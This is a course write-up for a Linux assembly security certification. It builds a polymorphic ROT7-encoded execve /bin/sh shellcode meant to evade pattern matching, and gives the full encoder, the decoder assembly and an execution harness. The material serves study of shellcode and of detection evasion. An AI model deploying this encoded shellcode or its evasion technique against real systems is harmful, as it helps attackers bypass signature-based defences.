# Assignment 6: ROT7 

This blog post has been created for completing the requirements of the SecurityTube Linux Assembly Expert certification:

http://securitytube-training.com/online-courses/securitytube-linux-assembly-expert/

Student ID: SLAE-670

## Problem

- Take up 3 shellcodes from Shell-Storm and create polymorphic versions of them to beat pattern matching
- The polymorphic versions cannot be larger than 150% of the existing shellcode
- Bonus points for making it shorter in length than original

## Solution

In this post we are going to look at the Download and Execute shellcode avaiable at ![http://shell-storm.org/shellcode/files/shellcode-900.php](http://shell-storm.org/shellcode/files/shellcode-900.php "").

### Shellcode Analysis

To begin, lets grab a copy of that shellcode, compile it, and trace it with GDB:

![alt text](https://github.com/adeptex/SLAE/blob/master/Assignment-6/rot7/gdb1.png "GDB")

As can be appreciated, the shellcode uses the `JMP-CALL-POP` technique to get the payload address on the stack. The payload in this case is is the following string:

![alt text](https://github.com/adeptex/SLAE/blob/master/Assignment-6/rot7/gdb2.png "Encoded Payload")

which is of course the ROT7 encoded version of the shellcode that we want to execute. 

To decode the encoded opcodes, the shellcode loops around `0x1e` (30) times, basically doing `f(x) = 0x100 + (0x7 - x)`, where `x` is the next opcode. The encoded opcode is replaced by the decoded one, which is the result of the aforementioned mathematical expression. When everything is decoded, the control is transfered to the shellcode address previously `JMP-CALL-POP`ed.

If we break after the shellcode has been decoded, we can see that the decoded version is what is commonly known as a "stack-based `execve()` shell" shellcode. 

![alt text](https://github.com/adeptex/SLAE/blob/master/Assignment-6/rot7/gdb3.png "Decoded Payload")

### Polymorphic Shellcode

Just like in the original Shell-Storm post, we will need a ROT7 encoder for our decoder to use. We will also use an `execve()` shellcode for this example.

### a6-rot7-encode.py
```python
#!/usr/bin/python

# Python ROT-7 Encoder
# execve 24 bytes
shellcode = (
    "\x31\xc0\x50\x68\x2f\x2f\x73\x68\x68\x2f\x62\x69\x6e\x89\xe3\x31"
    "\xc9\x89\xca\x6a\x0b\x58\xcd\x80"
)

encoded = "\\x%02x," % len(bytearray(shellcode))
encoded2 = "0x%02x," % len(bytearray(shellcode)) 

print 'Encoded shellcode ...'

for x in bytearray(shellcode) :
# boundary is computed as 255-ROT(x) where x, the amount to rotate by
    if x > 248:
        encoded += '\\x'
        encoded += '%02x' %(7 -(256 - x))
        encoded2 += '0x'
        encoded2 += '%02x,' %(7 -(256 - x))
    else:
        encoded += '\\x'
        encoded += '%02x'%(x+7)
        encoded2 += '0x'
        encoded2 += '%02x,' %(x+7)
    
print '\n%s\n\n%s\n\nShellcode Length: %d\n' % (encoded, encoded2, len(bytearray(shellcode)))
```

Running the encoder produces the following opcodes, which we will be decoding further on:

```
Encoded shellcode ...

\x18,\x38\xc7\x57\x6f\x36\x36\x7a\x6f\x6f\x36\x69\x70\x75\x90\xea\x38\xd0\x90\xd1\x71\x12\x5f\xd4\x87

0x18,0x38,0xc7,0x57,0x6f,0x36,0x36,0x7a,0x6f,0x6f,0x36,0x69,0x70,0x75,0x90,0xea,0x38,0xd0,0x90,0xd1,0x71,0x12,0x5f,0xd4,0x87,

Shellcode Length: 24
```

Like the original shellcode from Shell-Storm, the morphed version will use the `JMP-CALL-POP` technique to get the address of the encoded shellcode. However, the mathematical manipulation will be different: `f(x) = x - 0x7`, where `x` is the next opcode. The encoded opcode will be replaced by the decoded one, which would be the result of the aforementioned mathematical expression.

### a6-rot7-decode.nasm
```nasm
; SLAE Assignment 6: ROT7 decoder (morphed)
; http://shell-storm.org/shellcode/files/shellcode-900.php
; Original Shellcode Length: 74
; Morphed Shellcode Length:  54

global _start
section .text
_start:
	jmp short stage

decoder:
	pop esi						; shellcode address
	mov al, byte [esi]			; shellcode length
	xor ecx, ecx 				; position

decode:
	mov bl, byte [esi+ecx+1]	; get rot'ed byted
	sub bl, 0x7					; rot it back (-7)
	mov byte [esi+ecx], bl		; store it in shellcode
	inc ecx						; next position
	cmp al, cl					; check if reached the end of shellcode
	jnz short decode 			; 	if not, continue derot'ing
	jmp shellcode				;	else, execute derot'ed shellcode

stage:
	call decoder
	
	; Shellcode Format: 
	; 	byte[0] 	= length of shellcode (max 0xff)
	;	byte[1..] 	= rot'ed shellcode
	shellcode: db 0x18,0x38,0xc7,0x57,0x6f,0x36,0x36,0x7a,0x6f,0x6f,0x36,0x69,0x70,0x75,0x90,0xea,0x38,0xd0,0x90,0xd1,0x71,0x12,0x5f,0xd4,0x87
```

Let's compile, link, and get the opcodes:

```
nasm -f elf32 -o a6-rot7-decode.o a6-rot7-decode.nasm
ld -o a6-rot7-decode a6-rot7-decode.o 
objdump -d ./a6-rot7-decode |grep '[0-9a-f]:'|grep -v 'file'|cut -f2 -d:|cut -f1-7 -d' '|tr -s ' '|tr '\t' ' '|sed 's/ $//g'|sed 's/ /\\x/g'|paste -d '' -s |sed 's/^/"/'|sed 's/$/"/g' 
```

Make an executable skeleton for the opcodes:

### rot7.c
```c
#include<stdio.h>
#include<string.h>

unsigned char code[] = \
"\xeb\x16\x5e\x8a\x06\x31\xc9\x8a\x5c\x0e\x01\x80\xeb\x07\x88\x1c\x0e\x41\x38\xc8\x75\xf1\xeb\x05\xe8\xe5\xff\xff\xff\x18\x38\xc7\x57\x6f\x36\x36\x7a\x6f\x6f\x36\x69\x70\x75\x90\xea\x38\xd0\x90\xd1\x71\x12\x5f\xd4\x87";

int main()
{
	printf("Shellcode Length:  %d\n", strlen(code));
	int (*ret)() = (int(*)())code;
	ret();
}
```

And finally compile, execute, and check:

![alt text](https://github.com/adeptex/SLAE/blob/master/Assignment-6/rot7/example.png "Example")

Looks like everything works as expected: a `/bin/sh` is spawned.

As can be observed, the reported shellcode length is 54, which is 20 bytes shorter than the original 74. 

